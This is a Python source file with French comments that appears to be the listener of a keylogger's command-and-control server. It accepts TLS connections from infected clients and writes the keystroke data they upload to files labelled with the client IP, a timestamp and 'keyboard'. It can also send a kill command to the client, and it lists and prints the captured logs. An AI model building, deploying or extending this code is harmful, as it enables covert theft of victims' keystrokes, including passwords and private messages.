import socket, ssl, os
from time import strftime

def transfert(server_socket, kill):
    # Accepter une connexion entrante
    client_socket, client_address = server_socket.accept()
    print(f"Connexion de {client_address} établie !")

    # Création du socket SSL
    server_ssl = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_ssl.load_cert_chain(certfile="certificat.pem", keyfile="cle.pem")

    client_ssl = server_ssl.wrap_socket(client_socket,server_side=True,)

    if kill == 0:
        client_ssl.send(b"nokill")
        # Nom du fichier à recevoir IP client + heure
        time = strftime("%Y-%m-%d_%H-%M-%S")
        file_name = "resultats/" + client_address[0] + "-" + time + "-keyboard.txt"

        # Ouvrir le fichier en mode écriture binaire
        with open(file_name, "wb") as f:
            # Lire les données reçues du client
            data = client_ssl.recv(1024)
            while data:
                # Ecrire les données dans le fichier
                f.write(data)
                # Lire les données reçues du client
                data = client_ssl.recv(1024)

        print("Fichier reçu !")

    else:
        # Envoyer la commande kill au client
        client_ssl.send(b"kill")
        print("La commande kill a été envoyée au client.")

    # Fermer ssl
    client_ssl.close()

    return file_name

def dossier_resultats():
    # Créer un dossier pour les résultats
    try:
        os.mkdir("resultats")
        print("Dossier créé !")
    except FileExistsError:
        print("Le dossier existe déjà !")

def liste_fichiers():
    # Lister les fichiers de captures
    try:
        print("Liste des fichiers de captures :")
        for file in os.listdir("resultats"):
            print(f"- {file}")
    except FileNotFoundError:
        print("Aucun fichier de capture n'a été trouvé !")

def read_file(file_name):
    print("Contenu du fichier de capture :")
    with open(file_name, "r") as f:
        data = f.read()
        print(data)